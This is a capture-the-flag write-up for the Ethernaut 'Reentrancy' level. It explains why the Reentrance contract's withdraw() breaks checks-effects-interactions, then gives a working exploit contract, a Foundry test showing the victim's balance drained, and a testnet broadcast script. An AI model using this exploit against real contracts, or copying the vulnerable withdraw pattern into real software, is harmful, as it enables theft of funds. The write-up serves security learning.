## 👾 10. Reentrancy

<br>


### tl; dr

<br>

* contracts may call other contracts by function calls or transferring ether. they can also call back contracts that called them (*i.e.*, reentering) or any other contract in the call stack.
    - a **reentrancy attack** can happen when a contract is reentered in an invalid state. this can happen if the contract calls other untrusted contracts or transfers funds to untrusted accounts.
    - state in the blockchain is considered valid when the contract-specific invariants hold true. contract invariants are properties of the program state that are expected always to be true. for instance, the value of owner state variable, the total token supply, etc., should always remain the same.

- in its simplest version, an attacking contract exploits vulnerable code in another contract to seize the flow of operation or funds.
    - for example, an attacker could repeatedly call a `withdraw()` or `receive()` function (or similar balance updating function) before a vulnerable contract’s balance is updated.

* **[for a detailed review on reentrancy attacks, check my mirror post](https://mirror.xyz/go-outside.eth/7Q5DK8cZNZ5CP6ThJjEithPvjgckA24D2wb-j0Ps5-I)**.

<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/c07d1819-ecbd-4a82-9a6c-aaded440da1b">
</p>



<br>

```solidity
contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool success, ) = msg.sender.call{value: _amount}("");
            if (success) {
                _amount;
            }
            // unchecked to prevent underflow errors
            unchecked {
                balances[msg.sender] -= _amount; 
            }
        }
    }

    receive() external payable {}
}
```


<br>

---

### discussion

<br>

* the `Reentrance` contract starts with a state variable for `balances`:

<br>

```solidity
contract Reentrance {
  mapping(address => uint256) public balances;
```

<br>

* then we have a getter and a setter function for `donate()` (whoever donates some `ether` becomes part of `balances`) and `balanceOf()`: 

<br>

```solidity
function donate(address _to) public payable {
     balances[_to] = balances[_to] += msg.value;
}

function balanceOf(address _who) public view returns (uint256 balance) {
    return balances[_who];
}
```

<br>

* then, we have the `withdraw(amount)` function, which is the source of our reentrancy attack. 
    - for instance, note how it already breaks the **[`checks -> effects -> interactions` pattern](https://docs.soliditylang.org/en/v0.8.21/security-considerations.html#use-the-checks-effects-interactions-pattern)**.
    - in other words, if `msg.sender` is a (attacker) contract and since `balances` deduction is made after the call, the contract can call a `fallback()` to cause a recursion that sends the value multiple times before reducing the sender's balance.

<br>

```solidity
    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool success, ) = msg.sender.call{value: _amount}("");
            if (success) {
                _amount;
            }
            // unchecked to prevent underflow errors
            unchecked {
                balances[msg.sender] -= _amount; 
            }
        }
    }
```
<br>

<p align="center">
<img src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/bed1dd0f-707c-408a-88d8-ee04693667b9" width="50%" align="center"/></p>


<br><br>

* finally, we see a blank `receive()` function, which receives any `ether` sent to the contract without specifically calling `donate()`.
    - `receive()` is a new keyword in solidity 0.6.x, and it is used as a `fallback()` function for empty calldata (or any value) that is only able to receive ether. 
    - remember that solidity’s `fallback()` function is executed if none of the other functions match the function identifier or no data was provided with the function call (and it can be optionally `payable`). 

<br>

```solidity
receive() external payable {}
```



<br>


----

### solution


<br>

* our exploit needs to do the following:
    1. makes an initial donation of `ether` through `call()`.
    2. calls the first `withdraw(initialDeposit)` for this amount of `ether` (which triggers our exploit's `receive()` for the first time and starts the recursion).
    3. call the second `withdraw(address(level).balance)` to drain the contract.

<br>

* the exploit is located at `src/10/ReentrancyExploit.sol`. note that the attack occurs at `run()` and `receive()`. the function `withdrawtoHacker()` can be called afterwords to withdraw the balance from the `ReentrancyExploit` contract:

<br>

```solidity
contract ReentrancyExploit {

    Reentrance private level;
    bool private _ENTERED;
    address private owner;
    uint256 private initialDeposit;

    constructor(Reentrance _level) {
        owner = msg.sender;
        level = _level;
        _ENTERED = false;
    }

    function run() public payable {
        require(msg.value > 0, "must send some ether");
        initialDeposit = msg.value;
        level.donate{value: msg.value}(address(this));
        level.withdraw(initialDeposit);
        level.withdraw(address(level).balance);
    }

    function withdrawToHacker() public returns (bool) {
        uint256 hackerBalancer = address(this).balance;
        (bool success, ) = owner.call{value: hackerBalancer}("");
        return success;
    }

    receive() external payable {
        if (!_ENTERED) {
            _ENTERED = true;
            level.withdraw(initialDeposit);
        }
    }
}

```

<br>

* which can be tested with `test/10/Reentrancy.t.sol`:

<br>

```solidity
contract ReentrancyTest is Test {

    Reentrance public level;
    ReentrancyExploit public exploit;
    address payable instance = payable(vm.addr(0x10053)); 
    address hacker = vm.addr(0x1337); 
    uint256 initialDeposit = 0.01 ether;
    uint256 initialVictimBalance = 200 ether;

    function setUp() public {
        vm.prank(instance);  
        vm.deal(instance, initialVictimBalance);
        vm.deal(hacker, initialDeposit);

        level = new Reentrance();
        level.donate{value: initialVictimBalance}(instance);
    }

    function testReentrancyHack() public {

        vm.startPrank(hacker);

        exploit = new ReentrancyExploit(level);
        
        ////////////////////////////
        // drain the victim contract
        ////////////////////////////

        assert(hacker.balance == initialDeposit);
        assert(instance.balance == initialVictimBalance);
        assert(address(level).balance == initialVictimBalance);
        assert(address(exploit).balance == 0);

        exploit.run{value: initialDeposit}();
        assert(address(exploit).balance == initialVictimBalance + initialDeposit);

        ///////////////////////////////////////////
        // withdraw from ReentrancyExploit contract
        ///////////////////////////////////////////        
        assert(hacker.balance == 0);
        bool success = exploit.withdrawToHacker();
        
        assert(success);
        assert(hacker.balance == initialVictimBalance + initialDeposit);
        assert(address(exploit).balance == 0);

        vm.stopPrank();
    }
}
```

<br>

* by running:

<br>

```shell
> forge test --match-contract ReentrancyTest -vvvv    
```



<br>

* finally, the solution can be submitted with `script/10/Reentrancy.s.sol`:

<br>

```solidity
contract Exploit is Script {

        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL10"));  
        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));    
        Reentrance level = Reentrance(instance); 
        ReentrancyExploit exploit;
        uint256 immutable initialDeposit = 0.001 ether;
          
        function run() external {

            vm.startBroadcast(hacker);
            
            exploit = new ReentrancyExploit(level);
            exploit.run{value: initialDeposit}();
            bool success = exploit.withdrawToHacker();
            assert(success);

            vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/10/Reentrancy.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>


---


### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



<br>

